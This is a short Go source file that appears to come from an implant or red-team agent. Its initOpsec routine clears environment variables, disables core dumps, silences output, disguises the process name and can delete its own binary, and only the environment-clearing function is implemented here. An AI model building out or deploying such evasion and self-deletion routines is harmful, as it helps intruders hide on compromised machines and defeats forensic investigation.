package agent

import (
	"os"
	"strings"
)

// initOpsec applies operational security hardening at startup.
// The individual operations are implemented per-platform in opsec_linux.go,
// opsec_windows.go, and opsec_other.go.
func initOpsec(procName string, selfDelete bool) {
	clearEnvironment()
	disableCoreDumps()
	silenceOutput()
	masqueradeProcess(procName)
	platformOpsec()
	if selfDelete {
		selfDeleteBinary()
	}
}

// clearEnvironment removes all environment variables to prevent leaking
// sensitive data or revealing the agent's context.
func clearEnvironment() {
	for _, env := range os.Environ() {
		key, _, _ := strings.Cut(env, "=")
		os.Unsetenv(key)
	}
}
